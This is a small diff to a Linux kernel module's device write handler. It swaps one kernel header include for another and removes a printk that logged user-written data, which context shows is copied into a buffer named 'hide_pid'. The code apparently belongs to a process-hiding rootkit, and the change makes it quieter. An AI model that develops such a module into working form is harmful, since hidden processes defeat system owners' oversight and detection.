@@ -2,7 +2,7 @@
     #define DEVICE_HANDLER
 
 #include <linux/miscdevice.h> // dev
-#include <linux/types.h>
+#include <linux/sched.h>
 #include <linux/fs.h>
 #include <linux/uaccess.h> // copy to/from user space
 
@@ -43,7 +43,6 @@ ssize_t writer(struct file *filep,const char *buff,size_t count,loff_t *offp) //
             strcpy(hide_pid, last_data);
         }
     }
-    printk(KERN_INFO "%s\n", last_data);
     return 0;
 }
 
